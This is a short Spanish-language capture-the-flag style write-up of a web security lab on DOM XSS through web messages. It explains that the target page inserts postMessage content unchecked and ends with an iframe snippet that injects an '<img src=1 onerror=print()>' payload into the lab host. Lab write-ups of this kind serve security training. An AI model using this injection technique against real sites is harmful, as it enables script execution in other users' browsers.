## Reto 1: DOM XSS usando mensajes web

Este laboratorio demuestra una vulnerabilidad simple de mensajes web. Para resolverla, utilice el servidor de exploits para enviar un mensaje al sitio objetivo que causa la... print()función a llamar.


Este laboratorio demuestra cómo una vulnerabilidad DOM XSS puede explotarse a través del uso de web messages. La página objetivo escucha mensajes entrantes con addEventListener y luego inserta su contenido directamente en el DOM dentro de un contenedor específico, sin ningún tipo de validación.

Desde el servidor de explotación, se carga la página vulnerable dentro de un iframe y se utiliza postMessage para enviar un payload malicioso que contiene una etiqueta img con un atributo onerror que ejecuta la función print. Esta acción demuestra cómo el uso inseguro de web messages puede comprometer la seguridad del sitio cuando el contenido recibido se trata como si fuera seguro.


```html
<style>
    iframe {
        position:relative;
        width:900px;
        height: 900px;
        z-index: 2;
    }

</style>
<iframe src="https://0ab2005503c2923b803bc6fc00bd0017.web-security-academy.net/" onload="this.contentWindow.postMessage('<img src=1 onerror=print()>','*')">
```